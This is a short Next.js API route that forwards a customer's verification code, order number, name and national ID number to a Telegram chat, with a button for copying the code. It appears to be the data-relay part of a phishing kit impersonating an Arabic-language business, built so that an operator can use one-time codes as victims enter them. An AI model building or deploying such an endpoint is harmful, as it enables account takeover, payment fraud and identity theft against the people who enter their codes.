import { NextRequest, NextResponse } from "next/server";
import { rateLimit, sendToTelegram } from "../../lib/rateLimit";

export async function POST(req: NextRequest) {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "unknown";
  if (!rateLimit(ip, 10, 15 * 60 * 1000)) {
    return NextResponse.json({ ok: false, error: "عدد محاولات كثيرة" }, { status: 429 });
  }

  const { code, orderId, customerName, customerId } = await req.json();

  const text = [
    `🔐 كود تحقق جديد`,
    `🏢 مؤسسة برج المبدع `,
    `🆔 رقم الطلب: ${orderId ?? "—"}`,
    `👤 اسم العميل: ${customerName ?? "—"}`,
    `🪪 رقم الهوية: ${customerId ?? "—"}`,
    `📟 الكود: ${code}`,
  ].join("\n");

  const reply_markup = {
    inline_keyboard: [[{ text: "📋 نسخ الكود", copy_text: { text: code } }]],
  };

  const sent = await sendToTelegram({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup });

  return NextResponse.json({ ok: sent }, { status: sent ? 200 : 502 });
}
